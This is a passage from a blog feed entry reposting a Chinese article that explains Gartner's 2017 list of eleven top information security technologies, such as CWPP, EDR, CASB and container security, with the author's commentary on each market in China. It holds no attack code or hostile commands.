      
    </entry>
    
    
    
    <entry>
      <title>逐一解读Gartner评出的11大信息安全技术</title>
      <link href="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
      <url>/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="转自：https-blog-51cto-com-yepeng-2082979"><a href="#转自：https-blog-51cto-com-yepeng-2082979" class="headerlink" title="转自：https://blog.51cto.com/yepeng/2082979"></a>转自：<a href="https://blog.51cto.com/yepeng/2082979">https://blog.51cto.com/yepeng/2082979</a><p>[最后修订@2018-10-29]</p><p>【序】</p><p>本文首发于<a href="https://www.sec-un.org/%e6%b5%85%e6%9e%90gartner%e8%af%84%e5%87%ba%e7%9a%84%e5%8d%81%e4%b8%80%e5%a4%a7%e4%bf%a1%e6%81%af%e5%ae%89%e5%85%a8%e6%8a%80%e6%9c%af/"> Sec-UN</a>，现在本人博客发表，并做了几处勘误。而在更早前，曾经写过一篇题为《<a href="http://blog.51cto.com/yepeng/1962301"> Gartner: 2017年11大信息安全技术（解读版）</a>》的文章，当时对17年新入选的6个技术做了一些介绍。而本人则将11个技术逐一进行了一番解读，并简述了国内的对应发展现状。对于17年新入选的6个的解读也更加细致。当时那个文章主要是传播Gartner总结出来的新技术，而这个文章则是希望通过介绍Gartner提出来的最新技术让大家一窥国际网络安全业界的最新发展动态。</p><p><strong>结合最近几年间Gartner评选出来的新酷技术（注：本人没有找到2015年的），我认为以下几点值得关注：</strong></p><p><strong>1）Gartner一直十分推崇EDR、CASB、DevSecOps、新型隔离技术（譬如远程浏览器）每年都将其纳入顶级技术之列；</strong></p><p><strong>2）云安全是Gartner考察的重点，也说明了云计算作为安全技术颠覆者的威力，不仅是云计算带来的安全新挑战，也包括云计算对安全技术本身的颠覆；</strong></p><p><strong>3）沙箱、大数据安全分析、威胁情报和UEBA技术不断下沉，越来越多成为各类安全技术的一个能力或者一种支撑。也就是说，未来我们单纯去讲述这些技术，或者单纯依靠这些技术的产品将不会再有大的增长。相反，更多见到的则是将这些技术与其它技术结合起来的产品和市场。很快，我们就会发现，大谈特谈这些技术的人会越来越少，而声称用了这些技术的产品会十分普遍，人们更多会谈结合这些技术有什么应用场景，达到了什么安全效果。</strong></p><p><strong>Gartner历年评选的顶级技术</strong></p><p><a href="./%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825021930970.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825021930970.png"></a></p><p>【正文】</p><p>浅析Gartner十一大信息安全技术</p><p>Benny Ye  最后修改于2018/3/5</p><p>1       概述</p><p>在2017年6月份举办的第23届Gartner安全与风险管理峰会上，Gartner知名分析师Neil McDonald发布了2017年度的11个最新最酷的信息安全技术。</p><p> Gartner选择年度顶级技术的标准是：</p><p>1）不能仅仅是个趋势（譬如大数据、IoT）；</p><p>2）必须是真实存在的安全技术门类，并且有实实在在的厂商提供这类技术和产品；</p><p>3）不能仅仅处于研究状态，但也不能已经成为主流技术；</p><p>4）符合Gartner对于客户需求和技术发展趋势的判断。</p><p>按照这个标准，基本上顶级技术都会位于Gartner Hype Cycle的曲线顶峰部分或者是低谷的部分。</p><p><a href="./%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022121190.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022121190.png"></a></p><p>这11大技术分别是：</p><p>1）  <strong>Cloud Workload Protection Platforms****：云工作负载保护平台CWPP</strong></p><p>2）  <strong>Remote Browser****：远程浏览器</strong></p><p>3）  <strong>Deception****：欺骗技术</strong></p><p>4）  <strong>Endpoint Detection and Response****： 端点检测与响应EDR</strong></p><p>5）  <strong>Network Traffic Analysis****：网络流量分析NTA</strong></p><p>6）  <strong>Managed Detection and Response****：可管理检测与响应MDR</strong></p><p>7）  <strong>Microsegmentation****：微隔离</strong></p><p>8）  <strong>Software-Defined Perimeters****：软件定义边界SDP</strong></p><p>9）  <strong>Cloud Access Security Brokers****：云访问安全代理CASB</strong></p><p>10）<strong>OSS Security Scanning and Software Composition Analysis for DevSecOps****：面向DevSecOps的开源软件（OSS）安全扫描与软件成分分析</strong></p><p>11）<strong>Container Security****：容器安全</strong></p><p>Gartner将这11项技术分为了三类：</p><p>1）             对抗威胁的技术：这类技术都在Gartner的自适应安全架构的范畴之内，包括CWPP、远程浏览器、欺骗技术、EDR、NTA、MDR、微隔离；</p><p>2）             访问与使能技术：包括SDP、CASB；</p><p>3）             安全开发：包括OSS安全扫描与软件成分分析、容器安全。</p><p>从另外一个角度看，这11项技术有5个都直接跟云安全挂钩（CWPP、微隔离、SDP、CASB、容器安全），也应证了云技术的快速普及。</p><p>需要指出的是，Gartner每年对顶级的信息安全技术评选都是具有连续性的。针对上述11大技术，其中远程浏览器、欺骗技术、EDR、微隔离、CASB共5个技术也出现在了2016年度的10大信息安全技术列表之中。</p><p>**2       **<strong>十一大技术浅析</strong></p><p>以下技术分析综合了Gartner对11大顶级技术的官方发布新闻稿，以及各个技术相关的分析报告。文中还参杂了本人的理解。</p><h2 id="2-1-CWPP-云工作负载保护平台"><a href="#2-1-CWPP-云工作负载保护平台" class="headerlink" title="2.1     CWPP****云工作负载保护平台"></a>2.1     <strong>CWPP****云工作负载保护平台</strong></h2><p>现在数据中心的工作负载都支持运行在包括物理机、虚拟机、容器、私有云在内的多种环境下，甚至往往出现部分工作负载运行在一个或者多个公有云IaaS提供商那里的情况。混合CWPP为信息安全的管理者提供了一种集成的方式，让他们能够通过一个单一的管理控制台和统一的安全策略机制去保护那些工作负载，而不论这些工作负载运行在何处。</p><p>事实上，CWPP这个概念就是Neil本人提出的。他在2016年3月份发表了一份题为《CWPP市场指南》的分析报告，并第一次对CWPP进行了正式定义：CWPP市场是一个以工作负载为中心的安全防护解决方案，它是一种典型的基于代理（Agent）的技术方案。这类解决方案满足了当前横跨物理和虚拟环境、私有云和多种公有云环境的混合式数据中心架构条件下服务器工作负载防护的独特需求。还有的甚至也同时支持基于容器的应用架构。</p><p>Neil将CWPP解决方案的能力进行了层次划分，并归为基础支撑、核心能力、扩展能力三大类。下图是Neil发布的2017年版《CWPP市场指南》中描绘的能力层次图，由上至下，重要性逐渐递增：<br><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022156103.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022156103.png"></a></p><p>其实，CWPP这个提法在Gartner内部还是存在分歧的，本人跟Gartner的分析师就此进行过讨论。Gartner将CWPP市场映射为一套对云中负载进行安全防护的解决方案，而非单一的CWPP产品，因为CWPP的每个能力层都涉及不同的技术，整个CWPP涉及的技术面更是十分广泛。此外，每个CWPP提供商的产品功能都不尽相同，甚至存在较大差异。而用户要对其云工作负载（云主机）进行防护的话，恐怕也不能选择某个单一的CWPP产品，而需要统筹考虑，进行多种技术的集成。当然，不排除随着Gartner力推CWPP概念，将来会出现更加完整的CWPP产品，即所谓的“Single pane of glass to hybrid cloud workload protection”。</p><p>在2017年的云安全Hype Cycle中，CWPP位于低谷位置，Gartner认为CWPP尚处于青春期，距离成熟市场还有2到5年的时间。</p><p>在本人看来，随着云计算的迅速普及，很多传统的安全防护技术的有效性下降了，部署难度增加了。同时，公有云使得用户对云中主机（工作负载）的安全掌控能力降低了。因此，以Agent技术流为代表的云主机防护技术蓬勃兴起。还需要指出的是，终端防护系统无法覆盖对云工作负载的的安全防护需求。目前，国内已经有厂商涉足CWPP市场。希望随着我们对CWPP认识的清晰，不要以后国内出现一窝蜂地将传统技术简单包装而成的CWPP厂商，就如EDR那样。</p><h2 id="2-2-远程浏览器"><a href="#2-2-远程浏览器" class="headerlink" title="**2.2     **远程浏览器"></a>**2.2     **<strong>远程浏览器</strong></h2><p>鉴于浏览器往往成为***的入口，因此有人将浏览器部署在远程的一个“浏览器服务器池”（通常是基于linux的）中。用户使用这些远程的浏览器来进行网页访问。这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的。从而使得客户所在网络的暴露面大大降低，而风险被转移到浏览器服务器池那里去了。而在浏览器服务器池那边可以实施专门的安全保护与控制。更进一步，这个浏览器服务器池可以被包装为一种云服务（SaaS），当然也可以运行在隔离的客户侧。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022234171.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022234171.png"></a></p><p>上图展示了远程浏览器技术的两种应用模式：部署在DMZ区，或者以SaaS模式交付。</p><p>远程浏览技术的本质是一种隔离技术。其核心技术是在远程服务器上对WEB内容进行渲染（rendering），并能够将渲染后的信息重新编码成HTML5回传给用户本地浏览器。此外，该技术还要支持远程浏览器与用户本地浏览器之间的双向通讯（譬如将WEB内容、音视频信息传递到本地，以及将本地的键盘鼠标操作传给远程浏览器）。</p><p>需要指出的是，远程浏览技术跟远程桌面技术（包括虚拟桌面）是不同的。相较而言，远程浏览技术更加轻量级，对服务器性能要求低很多，并且还不涉及虚拟桌面许可证问题（如果用户多的话，许可授权费用不菲）。而每个虚拟桌面的会话都要一个完整的VM来支撑，太重，如果仅仅为了远程浏览只用，显得浪费了。此外，还有一些终端防护类产品能够对用户本地浏览器或者相关进程进行加固和微隔离，但可能会对终端造成一定的不便，而远程浏览器技术通常不需要在客户端装agent。综合来看，在浏览隔离这块，Gartner更看好远程浏览技术。</p><p>Gartner认为，远程浏览技术的兴起可能会冲击现在的Secure Web Gateway（SWG，上网行为管理）市场，或者说未来的SWG可能会集成远程浏览的功能。</p><p>鉴于当前大部分***都是跟浏览器（包括浏览器自身及其插件）和里面的WEB内容有关的，Gartner预测，到2021年，将会有20%的企业采用远程浏览器解决方案。截至目前，本人还未看到国内有类似的产品出现。</p><p>尽管Gartner看好这项技术，但该技术本身目前还面临诸多挑战，尚未成熟，不少厂商正在这个领域寻求技术和市场突破。主要的挑战包括：必须支持PDF、Flash，甚至是JVM等等常见WEB内容的转换呈现；对于不支持的WEB内容如何处理？如何支持用户安全下载远程文件？如何处理富文本的复制/粘贴？目前看到的远程浏览器产品一般都带有集中管理与分析功能、文件沙箱和恶意代码检测功能。</p><h2 id="2-3-欺骗技术"><a href="#2-3-欺骗技术" class="headerlink" title="**2.3     **欺骗技术"></a>**2.3     **<strong>欺骗技术</strong></h2><p>这种技术的本质就是有针对性地对攻|击者进行我方网络、主机、应用、终端和数据的伪装，欺骗攻|击者，尤其是攻|击者的工具中的各种特征识别环节，使得那些工具产生误判或失效，扰乱攻|击者的视线，将其引入死胡同，延缓攻|击者的时间。譬如可以设置一个伪目标/诱饵，诱骗攻|击者对其实施攻|击，从而触发攻|击告警。</p><p>欺骗技术往前可以追溯到蜜罐技术，随着技术的不断进步，现在的欺骗技术可以看作是蜜罐技术的升级版，欺骗和伪装物更加丰富，欺骗技术的保护重心也从边界转移到了网络内部，尤其是大规模复杂企业内部网络，并出现了分布式欺骗平台（Distributed Deception Platform）。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022307790.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022307790.png"></a></p><p>2017年初，Gartner在中国做了一次Local Briefing。会上，DDP的提出者（2015年）Lawrence Pingree专门做了一个题为《The art of Deception and its benefits for lean-forward security programs》的演讲。</p><p>Gartner十分看重欺骗技术，在2018年10大战略技术之一的CARTA（持续自适应风险与信任评估）中，欺骗技术承担了重要的角色，作为运行时风险与信任评估的重要手段之一。随着人们越来越关注威胁检测与响应，出现了很多新兴的威胁检测技术，包括欺骗技术，以及同在11大技术之列的NTA、EDR，还有UEBA，等等。Gartner认为欺骗技术在各种威胁检测技术中具有独特的价值，具有更好的适应性和可行性，尤其是在工控和物联网环境中，并能与其他技术形成良性互补。</p><p>Gartner预测到2019年10%的企业将采用这类技术，主动地进行对抗。目前，国内有不少从事欺骗技术的初创公司和产品，但要达到DDP的平台级水平，还需要大跨越。</p><h2 id="2-4-EDR端点检测与响应"><a href="#2-4-EDR端点检测与响应" class="headerlink" title="*2.4     EDR端点检测与响应*"></a>*<em>2.4     <strong><strong>EDR</strong></strong>端点检测与响应</em>*</h2><p>EDR在2014年就进入Gartner的10大技术之列了。EDR工具通常记录大量端点级系统的行为与相关事件，并将这些信息存储在终端本地或者集中数据库中。然后对这些数据进行IOC比对，行为分析和机器学习，用以持续对这些数据进行分析，识别信息泄露（包括内部威胁），并快速对攻|击进行响应。目前EDR的核心支撑技术包括大数据安全分析（BDSA）技术。</p><p>EDR的保护目标是端点。他的出现最初是为了弥补传统终端/端点管理系统（Gartner称为EPP）的不足。而现在，EDR正在与EPP迅速互相***融合，但Gartner预计未来三年EDR和EPP仍将并存。</p><p>EDR解决方案应具备四大基本功能：安全事件检测、安全事件调查、在端点上遏制安全事件，以及将端点修复至感染前的状态，正好对应Gartner自适应安全架构的检测和响应两个阶段。这里面涉及到了机器学习、大数据分析、威胁捕猎等等尚未成熟的新兴技术和高交互性技术。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022330859.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022330859.png"></a></p><p>仔细研究可以发现，EDR的目标设定还是比较高级的，至少跟EPP相比，对分析人员的要求高出很多。EDR的落地不仅仅是一个技术问题，还涉及到人员组织和流程，以及高水平的安全分析师。因此，将EDR跟SOC结合起来，对于大型企业和组织是一个值得考虑的选项。而对于中小型客户而言，将EDR封装在MSS/MDR中，以服务的方式获得这个能力则可以一试。</p><p>需要指出的是，端点在这里通常指终端，但实际并不限于终端，还可以包括服务器。</p><p>EDR市场发展十分迅速，在2017年底，Gartner首次发布了EDR的市场指南，并对EDR技术的未来发展趋势进行了详细的分析，可以发现EDR技术越来越庞杂，正在发展成为一个平台类产品。</p><p>Gartner预计到2021年，80%的大型企业、20%的中型企业和10%的小企业将部署EDR能力。目前，国内已经有多家厂商涉足EDR细分市场领域，但基本上处于摸索阶段，很多产品其实还基本上就是对传统终端管理产品的再包装，面临的挑战颇多。</p><h2 id="2-5-NTA-网络流量分析"><a href="#2-5-NTA-网络流量分析" class="headerlink" title="2.5     NTA****网络流量分析"></a>2.5     <strong>NTA****网络流量分析</strong></h2><p>作为一种威胁检测的新兴技术，NTA是在2013年提出来的，并位列五种检测高级威胁的手段之一。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022409472.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022409472.png"></a></p><p>根据Gartner的定义，NTA融合了传统的基于规则的检测技术，以及机器学习和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。NTA通过DFI和DPI技术来分析网络流量，通常部署在关键的网络区域对东西向和南北向的流量进行分析，而不会试图对全网进行监测。Gartner建议将NTA是做一种功能和能力，而非纯粹的一个产品。</p><p>在NTA入选11大技术的解说词中，Gartner说到：NTA解决方案通过监测网络的流量、连接和对象来识别恶意的行为迹象。对于那些试图通过基于网络的方式去识别绕过边界安全的高级攻|击的企业而言，可以考虑将NTA作为一种备选方案。</p><p>NTA与EDR一个关注网络，一个聚焦端点，但在技术和应用上有很多相似之处：都属于威胁检测类的新兴技术，都用到了大数据分析技术，都是安全分析的一个具体用例，都是CARTA的重要组成部分，都推荐与SIEM/SOC集成使用，都是一类对安全分析师水平要求较高的技术，用好不易。</p><p>在Gartner的Hype Cycle中，NTA处于炒作的高峰阶段，处于期望的顶点，远未成熟。目前，国内已经有一些从事NTA的公司和产品，本人就是其中之一。</p><h2 id="2-6-MDR-威胁检测与响应服务"><a href="#2-6-MDR-威胁检测与响应服务" class="headerlink" title="2.6     MDR****威胁检测与响应服务"></a>2.6     <strong>MDR****威胁检测与响应服务</strong></h2><p>MDR是一类服务，并且通常不在传统的MSS/SaaS提供商的服务目录中。作为一种新型的服务项目，MDR为那些想提升自身威胁检测、事件响应和持续监测能力，却又无力依靠自身的能力和资源去达成的企业提供了一个不错的选择。MDR对于SMB市场尤其具有吸引力，因为命中了他们的“兴奋点”。</p><p>MDR服务是Gartner在2016年正式提出来的，定位于对高级攻|击的检测与响应服务。与传统MSSP主要帮客户监测内部网络与互联网内外间流量不同，MDR还试图帮助客户监测内部网络中的流量，尤其是识别高级攻|击的横向移动环节的蛛丝马迹，以求更好地发现针对客户内部网络的高级攻|击。而要做到这点，就需要在客户网络中部署多种高级攻|击检测技术（设备），还要辅以安全分析。对于MDR服务而言，这些额外部署在客户侧的设备是属于服务提供商的，而非客户的。这些设备（硬件或者软件）既可能是基于网络的，也可能是基于主机的，也可能兼有之。在安全分析的过程中，会用到威胁情报，也可能用到专业的安全分析师。在检测出攻|击，进行响应的时候，MDR服务强调迅速、直接、轻量化（简洁）、高效，而不会过多顾及安全管理与事件处置的流程，很多时候通过提供商部署在客户侧的设备就响应处置掉了。显然，这种服务与传统的MSS相比，对客户而言更具影响性，但也更加高效，也是高级威胁对客户造成的风险越来越大的必然反应。</p><p>Gartner预计到2020年将有15%的组织使用MDR类的服务，而现在仅不到1%。同时，到2020年80%的MSSP都会提供MDR类的安全服务，称之为“Advanced MSS”。Gartner认为MSS和MDR是交集的关系。在未来两年，MSS尚不会完全覆盖MDR服务。</p><h2 id="2-7-微隔离"><a href="#2-7-微隔离" class="headerlink" title="**2.7     **微隔离"></a>**2.7     **<strong>微隔离</strong></h2><p>广义上讲，微隔离（也有人称做“微分段”）就是一种更细粒度的网络隔离技术，主要面向虚拟化的数据中心，重点用于阻止攻|击在进入企业数据中心网络内部后的横向平移（或者叫东西向移动），是软件定义安全的一种具体实践。流可见技术（注意：不是可视化技术）则与微隔离技术伴生，因为要实现东西向网络流的隔离和控制，必先实现流的可见性（Visibility）。流可见性技术使得安全运维与管理人员可以看到内部网络信息流动的情况，使得微隔离能够更好地设置策略并协助纠偏。此外，有些厂商还为不同工作负载之间的数据传输提供流量加密功能选项。Gartner提醒，谨防过度隔离！这是当前微隔离项目失败的首要原因。</p><p>微隔离技术的落地目前较为复杂，不用用户的诉求差异较大。Gartner将微隔离划分出了4种模式：内生云控制模式、第三方防火墙模式、混合式、叠加式。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022432027.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022432027.png"></a></p><p>本地云控制模式就是基于虚拟化平台、IaaS等云平台内建的能力来实现微隔离。譬如利用VMware、思科、AWS、微软云自带的功能。这种模式部署和使用相对简单，对用户更透明，但功能也相对简单，并且无法跨多厂商。</p><p>第三方防火墙模式又分为两种：一种是工作在虚机之上，可以跨多厂商基础架构、功能更为丰富，但部署和管理更复杂、性能和成本更高，并且无法实现底层的控制。另一种是借助NFV技术和vSwitch，运行在虚机之下。主流的FW/NGFW厂商都在布局这种模式。</p><p>混合模式是上述两种模式的混合使用，譬如东西向隔离用内生的，南北向隔离用第三方的。</p><p>叠加模式是比较有特色的，他的核心在于通过在目标虚机（也是工作负载）上部署Agent来实现实现更复杂的微隔离。目前很多初创公司聚焦于此模式及相关技术，视为一次弯道超车的机会。</p><p>需要指出的是，微隔离跟CWPP是有部分交集的，有时用户以为自己需要微隔离，其实发现用CWPP更合适。因此，需求分析和应用场景设计十分重要，要按需使用各种技术。</p><p>在Gartner的云安全Hype Cycle中，微隔离位于失望的低谷，还处于成熟的早期阶段。目前，国内已经出现了涉足微隔离的初创公司，但还处于孵化期。</p><h2 id="2-8-SDP软件定义边界"><a href="#2-8-SDP软件定义边界" class="headerlink" title="*2.8     SDP软件定义边界*"></a>*<em>2.8     <strong><strong>SDP</strong></strong>软件定义边界</em>*</h2><p>SDP将不同的网络相连的个体（软硬件资源）定义为一个逻辑集合，形成一个安全计算区域和边界，这个区域中的资源对外不可见，对该区域中的资源进行访问必须通过可信代理的严格访问控制，从而实现将这个区域中的资源隔离出来，降低其受攻|击的暴露面的目标。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022449490.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022449490.png"></a></p><p>这种技术最初是CSA云安全联盟提出来的，是SDN和软件定义安全（SDS）概念的交集。刚开始SDP主要针对WEB应用，到现在也可以针对其他应用来构建SDP了。SDP的出现消除了传统的固化边界，对传统的设置DMZ区，以及搭建V|PN的做法构成了挑战，是一种颠覆性的技术。也可以说，SDP定义了一种逻辑的、动态的边界，这个边界是以身份和情境感知为依据的。</p><p>在Gartner的云安全Hype Cycle中，SDP位于新兴阶段，正处于曲线的顶峰。Gartner预测，到2017年底，至少10%的企业组织将利用SDP技术来隔离敏感的环境。</p><h2 id="2-9-CASB云访问安全代理"><a href="#2-9-CASB云访问安全代理" class="headerlink" title="*2.9     CASB云访问安全代理*"></a>*<em>2.9     <strong><strong>CASB</strong></strong>云访问安全代理</em>*</h2><p>CASB在2016年就位列10大技术之中。最初，CASB被大致定义为一个应用代理安全网关，用于安全地连接起用户与多个云服务商。现如今，Gartner对CASB赋予了更广泛的含义：CASB作为一种产品或服务，为企业认可的云应用提供通用云应用使用、数据保护和治理的可见性。简单的说，就是随着用户越来越多采用云服务，并将数据存入（公有）云中，他们需要一种产品来帮助他们采用一致的策略安全地接入不同的云应用，让他们清晰地看到云服务的使用情况，实现异构云服务的治理，并对云中的数据进行有效的保护，而传统的WAF、SWG和企业防火墙无法做到这些，因此需要CASB。CASB一个很重要的设计理念就是充分意识到在云中（尤指公有云）数据是自己的，但是承载数据的基础设施不是自己的。Gartner指出CASB重点针对SaaS应用来提升其安全性与合规性，同时也在不断丰富针对IaaS和PaaS的应用场景。Gartner认为CASB应提供四个维度的功能：可见性、数据安全、威胁保护、合规性。</p><p>随着云应用的迅速普及，Gartner对CASB概念的放大，现在CASB的功能集合已经十分庞杂，几乎囊括了所有需要布置在用户和云服务提供商链路上的事情，包括认证、单点登录、授权、凭据映射、设备画像、数据安全（内容检查、加密、数据标记化/脱敏）、日志审计与告警、恶意代码检测与防护，等等。个人感觉，实在有点太重了，可能以后会拆解开来成为解决方案而非单一产品，就像我对CWPP的感觉一样。</p><p>Gartner预计到2020年，60%的大企业将通过部署CASB来实现云服务治理。</p><p>在Gartner的云安全Hype Cycle中，CASB位于失望的低谷，还处于青春期阶段。有趣的是，尽管CASB尚未成熟，但Gartner却在2017年底首次推出了CASB的魔力象限，可见Gartner对CASB青睐有加，急切盼望这个市场大发展。目前，国内已经有多个公司推出了自己的CASB产品，但不少还都是在原来堡垒机基础上的扩展封装，具体如何还有待观察。还有一点，就是国内企业级SaaS其实并不普及，还是以IaaS为主，这也是制约CASB发展的一个重要因素。所以，CASB目前在中国要因地制宜。</p><h2 id="2-10-面向DevSecOps的开源软件（OSS-）安全扫描与软件成分分析"><a href="#2-10-面向DevSecOps的开源软件（OSS-）安全扫描与软件成分分析" class="headerlink" title="*2.10        面向DevSecOps的开源软件（OSS*）安全扫描与软件成分分析"></a>*<em>2.10        <strong><strong>面向</strong></strong>DevSecOps</em><em><strong>的开源软件（</strong></em><em>OSS</em>*<strong>）安全扫描与软件成分分析</strong></h2><p>在2016年的10大信息安全技术中，也提到了DevSecOps，但强调的是DevSecOps的安全测试和RASP（运行时应用自保护）。今年，安全测试变成了安全扫描与软件成分分析，其实基本上是一个意思，只是更加具体化了。</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022530159.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022530159.png"></a></p><p>DevSecOps是Gartner力推的一个概念，有大量的相关分析报告。DevSecOps采用模型、蓝图、模板、工具链等等驱动的安全方法来对开发和运维过程进行自保护，譬如开发时应用测试、运行时应用测试、开发时/上线前安全漏洞扫描。它是一种自动化的、透明化的、合规性的、基于策略的对应用底层安全架构的配置。</p><p>对于DevSecOps的落地而言，最关键的一点就是自动化和透明化。各种安全控制措施在整个DevSecOps周期中都要能够自动化地，非手工的进行配置。并且，这个自动化的过程必须是对DevOps团队尽量透明的，既不能影响到DevOps的敏捷性本质，同时还要能够达成法律、合规性，以及风险管理的要求。</p><p>软件成分分析(SCA，Software Composition Analysis)是一个比较有趣的技术。SCA专门用于分析开发人员使用的各种源码、模块、框架和库，以识别和清点开源软件（OSS）的组件及其构成和依赖关系，并识别已知的安全漏洞或者潜在的许可证授权问题，把这些风险排查在应用系统投产之前，也适用于应用系统运行中的诊断分析。如果用户要保障软件系统的供应链安全，这个SCA很有作用。</p><p>在Gartner的应用安全的Hype Cycle中，SCA属于成熟早期的阶段，属于应用安全测试的范畴，既包含静态测试，也包含动态测试。</p><h2 id="2-11-容器安全"><a href="#2-11-容器安全" class="headerlink" title="**2.11        **容器安全"></a>**2.11        **<strong>容器安全</strong></h2><p>与虚拟机（VM）不同，容器使用的是一种共享操作系统（OS）的模型。对宿主OS的某个漏洞利用攻|击可能导致其上的所有容器失陷。即便容器本身是安全的，但如果缺少安全团队的介入，以及安全架构师的指导，容器的部署过程可能产生不安全因素。传统的基于网络或者主机的安全解决方案对容器安全没啥作用。容器安全解决方案必须保护容器从创建到投产的整个生命周期的安全。目前大部分容器安全解决方案都提供投产前扫描和运行时监测保护的能力。</p><p>根据Gartner的定义，容器安全包括开发阶段的风险评估和对容器中所有内容信任度的评估，也包括投产阶段的运行时威胁防护和访问控制。在Gartner的Hype 